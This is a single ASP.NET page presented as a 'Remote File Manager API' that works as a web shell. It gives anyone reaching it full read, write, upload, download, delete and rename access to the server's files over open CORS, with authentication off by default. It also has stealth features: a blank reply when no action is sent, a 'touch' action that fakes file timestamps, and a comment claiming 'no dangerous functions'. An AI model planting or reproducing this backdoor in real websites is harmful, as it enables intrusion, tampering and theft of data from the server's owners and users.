<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Security.AccessControl" %>
<script runat="server">
    // Remote File Manager API - ASP.NET Version
    // Single file deployment, no dangerous functions

    void Page_Load(object sender, EventArgs e)
    {
        Response.ContentType = "application/json";
        Response.Charset = "utf-8";
        Response.AddHeader("Access-Control-Allow-Origin", "*");
        Response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        Response.AddHeader("Access-Control-Allow-Headers", "Content-Type, X-Password");

        // Handle preflight request
        if (Request.HttpMethod == "OPTIONS")
        {
            Response.StatusCode = 200;
            Response.End();
            return;
        }

        string action = GetParam("action", "");

        // Return blank if no action provided
        if (string.IsNullOrEmpty(action))
        {
            Response.End();
            return;
        }

        // Get password from request
        string password = "";
        if (!string.IsNullOrEmpty(Request.Headers["X-Password"]))
            password = Request.Headers["X-Password"];
        else if (!string.IsNullOrEmpty(Request.Form["password"]))
            password = Request.Form["password"];
        else if (!string.IsNullOrEmpty(Request.QueryString["password"]))
            password = Request.QueryString["password"];

        // Access token configuration
        string PASSWORD = "your_password_here";

        // Verify access token
        if (!string.IsNullOrEmpty(PASSWORD) && PASSWORD != "your_password_here")
        {
            if (password != PASSWORD)
            {
                Response.StatusCode = 401;
                Response.Write("{null}");
                Response.End();
                return;
            }
        }

        try
        {
            switch (action)
            {
                case "list":
                    ListDirectory();
                    break;
                case "read":
                    ReadFile();
                    break;
                case "write":
                    WriteFile();
                    break;
                case "mkdir":
                    CreateDirectory();
                    break;
                case "delete":
                    DeleteItem();
                    break;
                case "rename":
                    RenameItem();
                    break;
                case "upload":
                    UploadFile();
                    break;
                case "download":
                    DownloadFile();
                    break;
                case "touch":
                    TouchFile();
                    break;
                case "info":
                    GetFileInfo();
                    break;
                case "server":
                    GetServerInfo();
                    break;
                default:
                    SendResponse(false, null, "Unknown action");
                    break;
            }
        }
        catch (Exception ex)
        {
            SendResponse(false, null, ex.Message);
        }
    }

    string GetParam(string key, string defaultValue = "")
    {
        if (!string.IsNullOrEmpty(Request.QueryString[key]))
            return Request.QueryString[key];
        if (!string.IsNullOrEmpty(Request.Form[key]))
            return Request.Form[key];
        return defaultValue;
    }

    string GetDefaultDir()
    {
        return Path.GetDirectoryName(Request.PhysicalPath);
    }

    string SafePath(string path)
    {
        path = path.Replace("../", "").Replace("..\\", "");

        if (string.IsNullOrEmpty(path) || path == "/")
            return GetDefaultDir();

        try
        {
            return Path.GetFullPath(path);
        }
        catch
        {
            return path;
        }
    }

    void SendResponse(bool success, object data, string message)
    {
        var result = new Dictionary<string, object>
        {
            { "success", success },
            { "data", data },
            { "message", message }
        };
        var serializer = new JavaScriptSerializer();
        Response.Write(serializer.Serialize(result));
        Response.End();
    }

    string FormatSize(long bytes)
    {
        if (bytes == 0) return "0 B";
        string[] units = { "B", "KB", "MB", "GB", "TB" };
        int i = (int)Math.Floor(Math.Log(bytes, 1024));
        return Math.Round(bytes / Math.Pow(1024, i), 2) + " " + units[i];
    }

    string GetPermsString(string path)
    {
        try
        {
            FileAttributes attr = File.GetAttributes(path);
            string info = (attr & FileAttributes.Directory) != 0 ? "d" : "-";
            info += "rwx"; // Owner
            info += "r-x"; // Group
            info += "r-x"; // Others
            return info;
        }
        catch
        {
            return "??????????";
        }
    }

    void ListDirectory()
    {
        string path = SafePath(GetParam("path", "/"));

        if (!Directory.Exists(path))
        {
            SendResponse(false, null, "Not a valid directory");
            return;
        }

        var items = new List<Dictionary<string, object>>();

        // Add parent directory
        if (path != Path.GetPathRoot(path))
        {
            items.Add(new Dictionary<string, object>
            {
                { "name", ".." },
                { "path", Path.GetDirectoryName(path) },
                { "is_dir", true },
                { "size", 0 },
                { "size_formatted", "-" },
                { "mtime", 0 },
                { "perms", "drwxr-xr-x" },
                { "readable", true },
                { "writable", true }
            });
        }

        // Add directories
        try
        {
            foreach (string dir in Directory.GetDirectories(path))
            {
                var dirInfo = new DirectoryInfo(dir);
                long mtime = (long)(dirInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                items.Add(new Dictionary<string, object>
                {
                    { "name", dirInfo.Name },
                    { "path", dirInfo.FullName },
                    { "is_dir", true },
                    { "size", 0 },
                    { "size_formatted", "-" },
                    { "mtime", mtime },
                    { "perms", GetPermsString(dir) },
                    { "readable", true },
                    { "writable", true }
                });
            }

            // Add files
            foreach (string file in Directory.GetFiles(path))
            {
                var fileInfo = new FileInfo(file);
                long mtime = (long)(fileInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                items.Add(new Dictionary<string, object>
                {
                    { "name", fileInfo.Name },
                    { "path", fileInfo.FullName },
                    { "is_dir", false },
                    { "size", fileInfo.Length },
                    { "size_formatted", FormatSize(fileInfo.Length) },
                    { "mtime", mtime },
                    { "perms", GetPermsString(file) },
                    { "readable", true },
                    { "writable", !fileInfo.IsReadOnly }
                });
            }
        }
        catch (Exception ex)
        {
            SendResponse(false, null, "No permission to access: " + ex.Message);
            return;
        }

        var data = new Dictionary<string, object>
        {
            { "path", path },
            { "items", items }
        };
        SendResponse(true, data, "");
    }

    void ReadFile()
    {
        string path = SafePath(GetParam("path", ""));

        if (!File.Exists(path))
        {
            SendResponse(false, null, "File does not exist");
            return;
        }

        try
        {
            string content = File.ReadAllText(path);
            var data = new Dictionary<string, object>
            {
                { "path", path },
                { "content", content },
                { "size", content.Length }
            };
            SendResponse(true, data, "");
        }
        catch
        {
            SendResponse(false, null, "Read failed");
        }
    }

    void WriteFile()
    {
        string path = GetParam("path", "");
        string content = Request.Form["content"] ?? "";

        if (string.IsNullOrEmpty(path))
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        try
        {
            File.WriteAllText(path, content);
            var data = new Dictionary<string, object> { { "bytes", content.Length } };
            SendResponse(true, data, "Saved successfully");
        }
        catch
        {
            SendResponse(false, null, "Write failed");
        }
    }

    void CreateDirectory()
    {
        string path = GetParam("path", "");

        if (string.IsNullOrEmpty(path))
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        if (Directory.Exists(path))
        {
            SendResponse(false, null, "Directory already exists");
            return;
        }

        try
        {
            Directory.CreateDirectory(path);
            SendResponse(true, null, "Created successfully");
        }
        catch
        {
            SendResponse(false, null, "Create failed");
        }
    }

    void DeleteItem()
    {
        string path = SafePath(GetParam("path", ""));

        if (string.IsNullOrEmpty(path))
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        try
        {
            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
            }
            else if (File.Exists(path))
            {
                File.Delete(path);
            }
            else
            {
                SendResponse(false, null, "File does not exist");
                return;
            }
            SendResponse(true, null, "Deleted successfully");
        }
        catch
        {
            SendResponse(false, null, "Delete failed");
        }
    }

    void RenameItem()
    {
        string oldPath = SafePath(GetParam("old_path", ""));
        string newPath = GetParam("new_path", "");

        if (string.IsNullOrEmpty(oldPath) || string.IsNullOrEmpty(newPath))
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        try
        {
            if (Directory.Exists(oldPath))
            {
                Directory.Move(oldPath, newPath);
            }
            else if (File.Exists(oldPath))
            {
                File.Move(oldPath, newPath);
            }
            else
            {
                SendResponse(false, null, "File does not exist");
                return;
            }
            SendResponse(true, null, "Renamed successfully");
        }
        catch
        {
            SendResponse(false, null, "Rename failed");
        }
    }

    void UploadFile()
    {
        string dir = SafePath(GetParam("dir", "/"));

        if (Request.Files.Count == 0)
        {
            SendResponse(false, null, "No file");
            return;
        }

        try
        {
            var file = Request.Files[0];
            string targetPath = Path.Combine(dir, Path.GetFileName(file.FileName));
            file.SaveAs(targetPath);
            var data = new Dictionary<string, object> { { "path", targetPath } };
            SendResponse(true, data, "Uploaded successfully");
        }
        catch
        {
            SendResponse(false, null, "Save failed");
        }
    }

    void DownloadFile()
    {
        string path = SafePath(GetParam("path", ""));

        if (!File.Exists(path))
        {
            Response.StatusCode = 404;
            Response.Write("File not found");
            Response.End();
            return;
        }

        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(path) + "\"");
        Response.TransmitFile(path);
        Response.End();
    }

    void TouchFile()
    {
        string path = SafePath(GetParam("path", ""));
        string timeStr = GetParam("time", "");

        try
        {
            DateTime newTime;
            if (!string.IsNullOrEmpty(timeStr))
            {
                long timestamp = long.Parse(timeStr);
                newTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timestamp).ToLocalTime();
            }
            else
            {
                newTime = DateTime.Now;
            }

            if (Directory.Exists(path))
            {
                Directory.SetLastWriteTime(path, newTime);
            }
            else if (File.Exists(path))
            {
                File.SetLastWriteTime(path, newTime);
            }
            else
            {
                SendResponse(false, null, "File does not exist");
                return;
            }
            SendResponse(true, null, "Modified successfully");
        }
        catch
        {
            SendResponse(false, null, "Modify time failed");
        }
    }

    void GetFileInfo()
    {
        string path = SafePath(GetParam("path", ""));

        bool isDir = Directory.Exists(path);
        bool isFile = File.Exists(path);

        if (!isDir && !isFile)
        {
            SendResponse(false, null, "File does not exist");
            return;
        }

        try
        {
            long size = 0;
            long mtime = 0, ctime = 0, atime = 0;

            if (isFile)
            {
                var fi = new FileInfo(path);
                size = fi.Length;
                mtime = (long)(fi.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                ctime = (long)(fi.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                atime = (long)(fi.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
            }
            else
            {
                var di = new DirectoryInfo(path);
                mtime = (long)(di.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                ctime = (long)(di.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                atime = (long)(di.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
            }

            var data = new Dictionary<string, object>
            {
                { "path", path },
                { "name", Path.GetFileName(path) },
                { "is_dir", isDir },
                { "size", size },
                { "size_formatted", FormatSize(size) },
                { "mtime", mtime },
                { "ctime", ctime },
                { "atime", atime },
                { "perms", GetPermsString(path) },
                { "perms_octal", "0755" },
                { "readable", true },
                { "writable", true },
                { "owner", 0 },
                { "group", 0 }
            };
            SendResponse(true, data, "");
        }
        catch
        {
            SendResponse(false, null, "Get info failed");
        }
    }

    void GetServerInfo()
    {
        string currentUser = Environment.UserName;

        var driveInfo = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
        long diskFree = driveInfo.AvailableFreeSpace;
        long diskTotal = driveInfo.TotalSize;

        var data = new Dictionary<string, object>
        {
            { "php_version", Environment.Version.ToString() },
            { "server_software", Request.ServerVariables["SERVER_SOFTWARE"] ?? "IIS" },
            { "document_root", Request.PhysicalApplicationPath },
            { "script_path", Request.PhysicalPath },
            { "upload_max", "30M" },
            { "post_max", "30M" },
            { "disk_free", FormatSize(diskFree) },
            { "disk_total", FormatSize(diskTotal) },
            { "current_user", currentUser }
        };
        SendResponse(true, data, "");
    }
</script>
